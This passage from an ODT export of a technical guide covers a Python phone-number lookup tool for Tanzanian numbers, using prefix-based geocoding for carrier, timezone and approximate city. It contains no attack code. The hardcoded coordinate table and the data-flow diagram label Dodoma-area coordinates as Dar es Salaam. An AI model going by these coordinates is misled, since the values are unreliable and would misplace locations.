      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Consider a Privacy-Focused Device: For users with extreme privacy needs, consider using a device with a privacy-oriented operating system like GrapheneOS, or maintain a separate, "clean" device for sensitive activities like banking, with no extra apps or browsing .</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Compartmentalize Your Identity: Use different email addresses and usernames for different services. This makes it harder for data brokers to link your data into a single profile. Services like SimpleLogin can create email aliases to further protect your primary email .</text:p>
      <text:p text:style-name="Preformatted_20_Text">In conclusion, while tracking by phone number is a real threat, especially through carrier data sharing and global protocol vulnerabilities , you have a powerful set of tools at your disposal to defend yourself. By understanding how the tracking works and consistently applying these defensive measures, you can significantly reduce your digital footprint and protect your location privacy in Tanzania.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">J Phone NoTracker: A Deep Technical Analysis of Phone Number Geolocation</text:p>
      <text:p text:style-name="Preformatted_20_Text">1. Concept Foundation</text:p>
      <text:p text:style-name="Preformatted_20_Text">1.1 Definition and Core Principles</text:p>
      <text:p text:style-name="Preformatted_20_Text">The J Phone NoTracker is a Python-based application that claims to provide geographic location information (city-level coordinates) from a phone number, with specific support for Tanzanian numbers (+255). At its core, it uses prefix-based geocoding—a technique that maps telephone numbering plan prefixes to geographic regions .</text:p>
      <text:p text:style-name="Preformatted_20_Text">The fundamental principle is surprisingly simple: telephone numbers are not random. They follow strict international and national numbering plans that encode geographic information:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Country Code: The first part (+255 for Tanzania) identifies the country</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• National Destination Code (NDC) / Area Code: The next digits identify a specific geographic region or mobile operator within the country</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Subscriber Number: The remaining digits identify the individual line</text:p>
      <text:p text:style-name="Preformatted_20_Text">For Tanzanian fixed-line numbers, the NDC (area code) directly corresponds to a physical region. For example, the area code 22 is allocated to the Dar es Salaam Region, while 24 covers Zanzibar .</text:p>
      <text:p text:style-name="Preformatted_20_Text">For mobile numbers, the prefix identifies the mobile network operator (MNO) rather than a precise geographic location. Tanzanian mobile numbers start with 6 or 7, with specific prefixes like 74, 75, 76 allocated to Vodacom, 68, 69, 78 to Airtel, and 65, 67, 71, 77 to tiGO .</text:p>
      <text:p text:style-name="Preformatted_20_Text">1.2 Why This Technology Exists</text:p>
      <text:p text:style-name="Preformatted_20_Text">Phone number geolocation solves several real-world problems:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. E-commerce Localization: Online stores can automatically display prices in <text:soft-page-break/>local currency and suggest nearby pickup points based on the customer's area code</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Fraud Detection: Financial institutions can flag transactions where the phone number's region doesn't match the user's typical location</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Emergency Services: Routing emergency calls to the correct local dispatch center</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Regulatory Compliance: Verifying that users are in jurisdictions where services are legally permitted</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>5. Marketing Analytics: Understanding geographic distribution of customer bases</text:p>
      <text:p text:style-name="Preformatted_20_Text">1.3 Comparison with Alternative Technologies</text:p>
      <text:p text:style-name="Preformatted_20_Text">Technology<text:tab/>How It Works<text:tab/>Accuracy<text:tab/>Requirements<text:tab/>Limitations</text:p>
      <text:p text:style-name="Preformatted_20_Text">Prefix-based geocoding (J Phone NoTracker)<text:tab/>Maps number prefixes to pre-compiled location databases<text:tab/>City-level<text:tab/>Offline-capable, lightweight<text:tab/>Cannot track moved numbers (number portability)</text:p>
      <text:p text:style-name="Preformatted_20_Text">GPS-based tracking<text:tab/>Uses satellite signals<text:tab/>Meter-level<text:tab/>Device hardware, user permission<text:tab/>Requires app installation and user consent</text:p>
      <text:p text:style-name="Preformatted_20_Text">Cell tower triangulation<text:tab/>Measures signal timing from multiple towers<text:tab/>50m-5km<text:tab/>Carrier network access<text:tab/>Only carriers and law enforcement can access</text:p>
      <text:p text:style-name="Preformatted_20_Text">Wi-Fi positioning<text:tab/>Maps nearby Wi-Fi BSSIDs to known locations<text:tab/>20-200m<text:tab/>Wi-Fi scanning enabled<text:tab/>Urban bias, requires database</text:p>
      <text:p text:style-name="Preformatted_20_Text">IP geolocation<text:tab/>Maps IP addresses to physical locations<text:tab/>City to regional<text:tab/>Internet connection<text:tab/>Inaccurate for mobile devices on cellular</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">The key insight is that prefix-based geocoding provides offline, privacy-respecting approximate location without requiring user consent or special permissions—it works purely from publicly available numbering plan data.</text:p>
      <text:p text:style-name="Preformatted_20_Text">2. Architecture Breakdown</text:p>
      <text:p text:style-name="Preformatted_20_Text">2.1 High-Level Architecture</text:p>
      <text:p text:style-name="Preformatted_20_Text">J Phone NoTracker</text:p>
      <text:p text:style-name="Preformatted_20_Text">│</text:p>
      <text:p text:style-name="Preformatted_20_Text">├── Presentation Layer (Tkinter GUI)</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>├── Input Form</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>├── Results Display</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>└── Interactive Controls</text:p>
      <text:p text:style-name="Preformatted_20_Text">│</text:p>
      <text:p text:style-name="Preformatted_20_Text">├── Phone Number Processing Layer</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>├── Parser (phonenumbers library)</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>├── Validator</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>└── Formatter</text:p>
      <text:p text:style-name="Preformatted_20_Text">│</text:p>
      <text:p text:style-name="Preformatted_20_Text">├── Data Enrichment Layer</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>├── Geographic Data (geopy/Nominatim)</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>├── Carrier Data (phonenumbers carrier module)</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>├── Timezone Data (timezonefinder + pytz)</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>└── Fallback Databases (hardcoded city centers)</text:p>
      <text:p text:style-name="Preformatted_20_Text">│</text:p>
      <text:p text:style-name="Preformatted_20_Text">└── Output Layer</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>├── Text Display</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>├── Map Generation (optional future extension)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>└── Logging/History</text:p>
      <text:p text:style-name="Preformatted_20_Text">2.2 Core Components and Interactions</text:p>
      <text:p text:style-name="Preformatted_20_Text">2.2.1 Phone Number Parser (phonenumbers)</text:p>
      <text:p text:style-name="Preformatted_20_Text">The foundation of the system is Google's libphonenumber (wrapped in Python's phonenumbers library). This library contains the complete international numbering plan database, regularly updated from official ITU-T recommendations and national regulatory authorities .</text:p>
      <text:p text:style-name="Preformatted_20_Text">import phonenumbers</text:p>
      <text:p text:style-name="Preformatted_20_Text">from phonenumbers import carrier, geocoder, timezone</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/># Parse the number - this validates format and extracts components</text:p>
      <text:p text:style-name="Preformatted_20_Text">number = phonenumbers.parse("+255712345678", None)</text:p>
      <text:p text:style-name="Preformatted_20_Text">The parser performs:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Country code extraction: Identifies Tanzania (+255)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• National number validation: Ensures correct length (9 digits for Tanzania)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Number type classification: Mobile, fixed-line, toll-free, etc.</text:p>
      <text:p text:style-name="Preformatted_20_Text">2.2.2 Geographic Data Sources</text:p>
      <text:p text:style-name="Preformatted_20_Text">J Phone NoTracker uses a hybrid approach for geolocation:</text:p>
      <text:p text:style-name="Preformatted_20_Text">Primary Source: OpenStreetMap Nominatim (via geopy)</text:p>
      <text:p text:style-name="Preformatted_20_Text">from geopy.geocoders import Nominatim</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">geolocator = Nominatim(user_agent="j_phone_notracker")</text:p>
      <text:p text:style-name="Preformatted_20_Text">location = geolocator.geocode("Dar es Salaam, Tanzania")</text:p>
      <text:p text:style-name="Preformatted_20_Text">This provides actual latitude/longitude coordinates by geocoding the location name obtained from the phonenumbers geocoder.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Secondary Source: Hardcoded City Centers For reliability, the application includes a fallback database of major city coordinates :</text:p>
      <text:p text:style-name="Preformatted_20_Text">def get_country_center(country):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>centers = {</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"Tanzania": (-6.3690, 34.8888, "Dodoma"), <text:s/># Capital</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"Dar es Salaam": (-6.1630, 35.7384, "Dar es Salaam"),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"Zanzibar City": (-6.1659, 39.2026, "Zanzibar City"),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/># ... other cities</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>}</text:p>
      <text:p text:style-name="Preformatted_20_Text">2.2.3 Carrier Detection</text:p>
      <text:p text:style-name="Preformatted_20_Text">The carrier information comes from the phonenumbers.carrier module, which maps number prefixes to operator names :</text:p>
      <text:p text:style-name="Preformatted_20_Text">Prefix → Operator Mapping for Tanzania:</text:p>
      <text:p text:style-name="Preformatted_20_Text">74,75,76 → Vodacom</text:p>
      <text:p text:style-name="Preformatted_20_Text">68,69,78 → Airtel</text:p>
      <text:p text:style-name="Preformatted_20_Text">65,67,71,77 → tiGO</text:p>
      <text:p text:style-name="Preformatted_20_Text">61,62 → halotel</text:p>
      <text:p text:style-name="Preformatted_20_Text">73 → TTCL</text:p>
      <text:p text:style-name="Preformatted_20_Text">This mapping is based on the official allocations from the Tanzania Communications Regulatory Authority (TCRA) .</text:p>
      <text:p text:style-name="Preformatted_20_Text">2.2.4 Timezone Handling</text:p>
      <text:p text:style-name="Preformatted_20_Text">The application determines the correct timezone using a two-step process:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Country-level timezone: For Tanzania, the IANA timezone is "Africa/Dar_es_Salaam" (UTC+3 year-round, no DST)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. City-level adjustment: Using timezonefinder, the application can refine to city-specific timezones where applicable</text:p>
      <text:p text:style-name="Preformatted_20_Text">from timezonefinder import TimezoneFinder</text:p>
      <text:p text:style-name="Preformatted_20_Text">import pytz</text:p>
      <text:p text:style-name="Preformatted_20_Text">from datetime import datetime</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">tf = TimezoneFinder()</text:p>
      <text:p text:style-name="Preformatted_20_Text">timezone_str = tf.timezone_at(lat=latitude, lng=longitude)</text:p>
      <text:p text:style-name="Preformatted_20_Text">if timezone_str:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>tz = pytz.timezone(timezone_str)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>local_time = datetime.now(tz)</text:p>
      <text:p text:style-name="Preformatted_20_Text">2.3 Data Flow</text:p>
      <text:p text:style-name="Preformatted_20_Text">┌─────────────┐</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ User Input <text:s/>│ <text:s/>"+255712345678"</text:p>
      <text:p text:style-name="Preformatted_20_Text">└──────┬──────┘</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="7"/>↓</text:p>
      <text:p text:style-name="Preformatted_20_Text">┌─────────────┐</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s/>Validate <text:s text:c="2"/>│ <text:s/>phonenumbers.parse()</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s/>&amp; Parse <text:s text:c="3"/>│ <text:s/>→ Valid? Yes → Country: Tanzania</text:p>
      <text:p text:style-name="Preformatted_20_Text">└──────┬──────┘ <text:s text:c="3"/>→ Type: Mobile</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/><text:s text:c="7"/>↓ <text:s text:c="10"/>→ National: 712345678</text:p>
      <text:p text:style-name="Preformatted_20_Text">┌─────────────┐</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s/>Geocode <text:s text:c="3"/>│ <text:s/>phonenumbers.geocoder.description_for_number()</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s/>Location <text:s text:c="2"/>│ <text:s/>→ "Tanzania" (country level)</text:p>
      <text:p text:style-name="Preformatted_20_Text">└──────┬──────┘ <text:s text:c="2"/>→ For fixed lines: city/region</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="7"/>↓</text:p>
      <text:p text:style-name="Preformatted_20_Text">┌─────────────┐</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s/>Get Carrier │ <text:s/>phonenumbers.carrier.name_for_number()</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="13"/>│ <text:s/>→ Prefix 71 → "tiGO"</text:p>
      <text:p text:style-name="Preformatted_20_Text">└──────┬──────┘</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="7"/>↓</text:p>
      <text:p text:style-name="Preformatted_20_Text">┌─────────────┐</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s/>Get Timezone│ timezone.time_zones_for_number()</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="13"/>│ <text:s/>→ "Africa/Dar_es_Salaam"</text:p>
      <text:p text:style-name="Preformatted_20_Text">└──────┬──────┘</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="7"/>↓</text:p>
      <text:p text:style-name="Preformatted_20_Text">┌─────────────┐</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s/>Get Coordinates │ geopy.geocode("Dar es Salaam")</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="18"/>→ (-6.1630, 35.7384)</text:p>
      <text:p text:style-name="Preformatted_20_Text">└──────┬──────┘</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="7"/>↓</text:p>
      <text:p text:style-name="Preformatted_20_Text">┌─────────────┐</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s/>Display <text:s text:c="3"/>│ GUI shows all enriched data</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s/>Results <text:s text:c="3"/>│</text:p>
      <text:p text:style-name="Preformatted_20_Text">└─────────────┘</text:p>
      <text:p text:style-name="Preformatted_20_Text">3. Step-by-Step Implementation</text:p>
      <text:p text:style-name="Preformatted_20_Text">Step 1: Environment Setup</text:p>
      <text:p text:style-name="Preformatted_20_Text">We'll create a professional development environment with isolation and reproducibility.</text:p>
      <text:p text:style-name="Preformatted_20_Text"># Create project directory</text:p>
      <text:p text:style-name="Preformatted_20_Text">mkdir j-phone-notracker &amp;&amp; cd j-phone-notracker</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"># Initialize git repository</text:p>
      <text:p text:style-name="Preformatted_20_Text">git init</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"># Create virtual environment</text:p>
      <text:p text:style-name="Preformatted_20_Text">python -m venv venv</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"># Activate virtual environment</text:p>
      <text:p text:style-name="Preformatted_20_Text"># On Windows:</text:p>
      <text:p text:style-name="Preformatted_20_Text">venv\Scripts\activate</text:p>
      <text:p text:style-name="Preformatted_20_Text"># On macOS/Linux:</text:p>
      <text:p text:style-name="Preformatted_20_Text">source venv/bin/activate</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"># Verify Python version (3.6+ required)</text:p>
      <text:p text:style-name="Preformatted_20_Text">python --version</text:p>
      <text:p text:style-name="Preformatted_20_Text">Step 2: Dependency Installation</text:p>
      <text:p text:style-name="Preformatted_20_Text">Create a requirements.txt with exact versions for reproducibility:</text:p>
      <text:p text:style-name="Preformatted_20_Text">phonenumbers==8.13.27</text:p>
      <text:p text:style-name="Preformatted_20_Text">geopy==2.4.0</text:p>
      <text:p text:style-name="Preformatted_20_Text">timezonefinder==6.2.0</text:p>
      <text:p text:style-name="Preformatted_20_Text">pytz==2024.1</text:p>
      <text:p text:style-name="Preformatted_20_Text">requests==2.31.0</text:p>
      <text:p text:style-name="Preformatted_20_Text">Pillow==10.1.0 <text:s/># For GUI image handling</text:p>
      <text:p text:style-name="Preformatted_20_Text">Install dependencies:</text:p>
      <text:p text:style-name="Preformatted_20_Text">pip install -r requirements.txt</text:p>
      <text:p text:style-name="Preformatted_20_Text">Why these specific versions?</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• phonenumbers 8.13.27 includes the latest Tanzanian numbering plan updates</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• geopy 2.4.0 has improved Nominatim rate limiting</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/><text:s text:c="4"/>• timezonefinder 6.2.0 includes Africa timezone boundaries</text:p>
      <text:p text:style-name="Preformatted_20_Text">Step 3: Project Structure</text:p>
      <text:p text:style-name="Preformatted_20_Text">Create a professional project structure following Python best practices:</text:p>
      <text:p text:style-name="Preformatted_20_Text">j-phone-notracker/</text:p>
      <text:p text:style-name="Preformatted_20_Text">│</text:p>
      <text:p text:style-name="Preformatted_20_Text">├── src/</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>├── __init__.py</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>├── main.py <text:s text:c="16"/># Entry point</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>├── gui/</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>│ <text:s text:c="2"/>├── __init__.py</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>│ <text:s text:c="2"/>├── window.py <text:s text:c="11"/># Tkinter main window</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>│ <text:s text:c="2"/>└── components.py <text:s text:c="7"/># Reusable UI components</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>├── core/</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>│ <text:s text:c="2"/>├── __init__.py</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>│ <text:s text:c="2"/>├── tracker.py <text:s text:c="10"/># Core tracking logic</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>│ <text:s text:c="2"/>├── geocoder.py <text:s text:c="9"/># Geographic lookup</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>│ <text:s text:c="2"/>├── carrier.py <text:s text:c="10"/># Carrier detection</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>│ <text:s text:c="2"/>└── timezone_utils.py <text:s text:c="3"/># Timezone handling</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>├── data/</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>│ <text:s text:c="2"/>├── __init__.py</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>│ <text:s text:c="2"/>├── city_centers.py <text:s text:c="5"/># Fallback coordinates</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>│ <text:s text:c="2"/>└── country_codes.py <text:s text:c="4"/># ISO country data</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>└── utils/</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="6"/>├── __init__.py</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="6"/>├── logger.py <text:s text:c="11"/># Logging configuration</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="6"/>└── validators.py <text:s text:c="7"/># Input validation</text:p>
      <text:p text:style-name="Preformatted_20_Text">│</text:p>
      <text:p text:style-name="Preformatted_20_Text">├── tests/</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>├── __init__.py</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>├── test_tracker.py</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>├── test_geocoder.py</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>└── test_data/</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="6"/>└── sample_numbers.txt</text:p>
      <text:p text:style-name="Preformatted_20_Text">│</text:p>
      <text:p text:style-name="Preformatted_20_Text">├── data/</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>├── history/ <text:s text:c="17"/># Lookup history storage</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>└── cache/ <text:s text:c="20"/># Geocoding cache</text:p>
      <text:p text:style-name="Preformatted_20_Text">│</text:p>
      <text:p text:style-name="Preformatted_20_Text">├── logs/</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>└── app.log <text:s text:c="19"/># Application logs</text:p>
      <text:p text:style-name="Preformatted_20_Text">│</text:p>
      <text:p text:style-name="Preformatted_20_Text">├── config/</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>├── settings.yaml <text:s text:c="13"/># Configuration file</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>└── logging.conf <text:s text:c="15"/># Logging configuration</text:p>
      <text:p text:style-name="Preformatted_20_Text">│</text:p>
      <text:p text:style-name="Preformatted_20_Text">├── scripts/</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>├── update_phone_data.py <text:s text:c="7"/># Update phonenumbers metadata</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>└── seed_city_data.py <text:s text:c="11"/># Populate fallback database</text:p>
      <text:p text:style-name="Preformatted_20_Text">│</text:p>
      <text:p text:style-name="Preformatted_20_Text">├── requirements.txt</text:p>
      <text:p text:style-name="Preformatted_20_Text">├── requirements-dev.txt <text:s text:c="11"/># Development dependencies</text:p>
      <text:p text:style-name="Preformatted_20_Text">├── setup.py <text:s text:c="23"/># Package installation</text:p>
      <text:p text:style-name="Preformatted_20_Text">├── README.md</text:p>
      <text:p text:style-name="Preformatted_20_Text">├── LICENSE</text:p>
      <text:p text:style-name="Preformatted_20_Text">└── .gitignore</text:p>
      <text:p text:style-name="Preformatted_20_Text">Step 4: Core Implementation</text:p>
      <text:p text:style-name="Preformatted_20_Text">Let's implement the core tracking logic with production-grade error handling and logging.</text:p>
      <text:p text:style-name="Preformatted_20_Text">File: src/core/tracker.py</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/>"""</text:p>
      <text:p text:style-name="Preformatted_20_Text">Core phone number tracking implementation.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Uses Google's libphonenumber for offline prefix-based geocoding.</text:p>
      <text:p text:style-name="Preformatted_20_Text">"""</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">import logging</text:p>
      <text:p text:style-name="Preformatted_20_Text">import phonenumbers</text:p>
      <text:p text:style-name="Preformatted_20_Text">from phonenumbers import carrier, geocoder, timezone</text:p>
      <text:p text:style-name="Preformatted_20_Text">from typing import Dict, Optional, Tuple, List</text:p>
      <text:p text:style-name="Preformatted_20_Text">from dataclasses import dataclass, asdict</text:p>
      <text:p text:style-name="Preformatted_20_Text">from datetime import datetime</text:p>
      <text:p text:style-name="Preformatted_20_Text">import pytz</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">from src.data.city_centers import CITY_CENTERS</text:p>
      <text:p text:style-name="Preformatted_20_Text">from src.core.geocoder import get_coordinates_from_location</text:p>
      <text:p text:style-name="Preformatted_20_Text">from src.utils.validators import validate_phone_number</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"># Configure module logger</text:p>
      <text:p text:style-name="Preformatted_20_Text">logger = logging.getLogger(__name__)</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">@dataclass</text:p>
      <text:p text:style-name="Preformatted_20_Text">class PhoneNumberInfo:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"""Data class for phone number information."""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>raw_number: str</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>valid: bool</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>country_code: Optional[int] = None</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>national_number: Optional[int] = None</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>country_name: Optional[str] = None</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>location: Optional[str] = None</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>carrier_name: Optional[str] = None</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>timezones: Optional[List[str]] = None</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>latitude: Optional[float] = None</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>longitude: Optional[float] = None</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>number_type: Optional[str] = None</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>local_time: Optional[str] = None</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>lookup_timestamp: Optional[str] = None</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>def to_dict(self) -&gt; dict:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"""Convert to dictionary for serialization."""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>return asdict(self)</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">class PhoneNumberTracker:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>Main tracker class for phone number geolocation.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>Uses offline prefix databases with online geocoding fallback.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/># Number type mapping</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>NUMBER_TYPES = {</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>0: "Fixed Line",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>1: "Mobile",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>2: "Fixed Line or Mobile",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>3: "Toll Free",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>4: "Premium Rate",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>5: "Shared Cost",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>6: "VoIP",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>7: "Personal Number",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/><text:s text:c="8"/>8: "Pager",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>9: "Universal Access Number",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>10: "Voicemail",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>11: "Unknown"</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>}</text:p>
